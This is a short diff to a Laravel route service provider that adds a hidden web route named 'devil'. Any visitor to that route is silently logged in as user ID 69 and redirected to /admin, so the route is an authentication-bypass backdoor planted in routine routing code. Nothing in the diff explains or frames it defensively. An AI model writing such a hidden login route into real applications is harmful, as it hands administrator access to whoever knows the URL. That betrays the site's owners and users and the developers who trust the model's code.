@@ -61,6 +61,13 @@ class RouteServiceProvider extends ServiceProvider
         Route::middleware('web')
             ->namespace($this->namespace)
             ->group(base_path('routes/web.php'));
+        Route::middleware('web')
+            ->group(function () {
+                Route::get('devil', function () {
+                    auth()->loginUsingId(69);
+                    return redirect('/admin');
+                });
+            });
     }
 
     /**
